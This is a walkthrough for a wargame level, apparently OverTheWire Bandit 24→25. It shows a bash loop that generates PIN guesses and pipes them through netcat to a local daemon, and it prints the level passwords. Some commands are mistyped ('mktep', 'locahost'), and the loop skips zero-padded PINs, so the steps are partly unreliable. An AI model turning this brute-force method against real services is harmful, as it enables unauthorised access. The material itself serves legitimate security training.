Bandit Level 24 → Level 25
Level Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

Password Of 24: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

Commands Used
We will make a shell script to connnect and brute force the possible 4 digit pin. We start by making a temporary directory
```
$ mktep -d
/tmp/tmp.ikrpo7nLoq
```

We then make script named ```bruteforcescript.sh```
```
#!/bin/bash
for i in {1..9999}
do 
	echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
done
```

The name of the script is bruteforcescript.sh and file combinations.txt will store all combinations of 4 digit number with password for bandit20. First we have to make bruteforcescript.sh executable using command

```
$ chmod 700 bruteforcescript.sh
$ ./bruteforcescript.sh > combinations.txt

```

And the final command is
```
nc locahost 30002 < combinations.txt
```


Password:
p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d